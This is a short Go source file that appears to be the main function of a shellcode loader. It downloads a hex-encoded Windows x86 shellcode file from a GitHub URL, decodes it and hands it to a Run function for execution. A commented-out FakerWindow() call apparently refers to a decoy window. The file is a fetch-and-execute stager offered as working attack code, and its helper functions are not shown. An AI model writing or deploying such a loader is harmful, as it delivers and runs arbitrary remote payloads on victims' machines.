package main

import (
	"encoding/hex"
	"os"
)

func main() {
//	FakerWindow()
	shellcodeStr := httpDownload("https://github.com/pench3r/pench3r.github.io/raw/master/example/windows_x86_shellcode.bin")
	shellcodeByte, err := hex.DecodeString(shellcodeStr)
	if err != nil {
		os.Exit(-1)
	}
	Run(shellcodeByte)
}